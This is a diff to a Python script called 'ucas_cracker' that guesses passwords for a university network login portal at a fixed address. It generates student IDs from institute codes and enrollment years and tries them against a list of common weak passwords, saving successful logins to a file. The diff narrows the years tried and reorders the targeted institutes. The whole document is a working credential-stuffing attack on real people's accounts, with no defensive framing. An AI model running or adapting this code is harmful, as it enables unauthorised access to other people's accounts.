@@ -6,14 +6,12 @@
     date:2016-04-13
 '''
 
-import urllib2, threading, urllib, traceback, re, json, cookielib, time, socket
+import urllib2, threading, urllib, traceback, json, cookielib, time, socket
 import gevent
 from gevent import monkey
 monkey.patch_all()
 
-institutes = [8014922,  8008233,  8002808,  8000761,  8007637,
-            8014924,  8014933,  8010840,  8014937,  8008801,
-            8010851,  8008805,  8006161,  8010861,  8008817,
+institutes = [   8008805,  8006161,  8010861,  8008817,
             8012938,  8012940,  8008846,  8008849,  8012951,
             8006811,  8006812,  8018458,  8002718,  8006815,
             8322208,  8012961,  8006837,  8006841,  8012661,
@@ -52,8 +50,10 @@ institutes = [8014922,  8008233,  8002808,  8000761,  8007637,
             8017758,  8017761,  8007313,  8007534,  8005514,
             8017808,  8017815,  8017220,  8013726,  8013727,
             8017826,  8004251,  8009643,  8009646,  8009649,
-            8007610,  8007611,  8013761,  8017861,  8015814,
-            8540107,  8540108,  8007631,  8015837
+            8007610,  8007611,  8013761,  8017861,  8015814,8000761,  8007637,
+            8014924,  8014933, 8010840,  8014937,  8008801,
+            8010851,
+            8540107,  8540108,  8007631,  8015837,  8008233, 8002808
             ]
 
 
@@ -64,10 +64,9 @@ class ucas_cracker():
         self.opener = urllib2.build_opener(self.handler) # 创建一个功能强大的opener
         self.header = {'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0'}
         self.login_url = 'http://210.77.16.21/eportal/InterFace.do?method=login'
-        self.skip_ids = set([201428002808004])
+        self.skip_ids = set(['201428002808002', '201328010840023'])
         self.default_passwd = ['ucas', 'ucas123', 'qq123456', 'wang1234', '111111', '11111111', '1869', '112233', '123123', '123321', '654321', '666666', '888888', 'acdef', 'abcabc', 'abc123', 'a1b2c3', 'aaa111', '123qwe', 'qwerty', 'qweasd', 'password', '123456']
-        #self.default_passwd = ['ucas', 'ucas123']
-        self.outfile = open('res.txt', 'w+')
+        self.outfile = open('res.txt', 'r+')
         self.stop = False
 
 
@@ -104,8 +103,9 @@ class ucas_cracker():
 
 
     def generator(self):
-        years = ['2014', '2009', '2010', '2011', '2012' ,'2013', '2008']
-        features = ['2', '1', 'E', 'K']
+        #years = ['2014', '2009', '2010', '2011', '2012' ,'2013', '2008']
+        years = ['2014', '2013']
+        features = ['2', '1', 'E']
         for institute in institutes:
             for grade in years:
                 for feature in features:
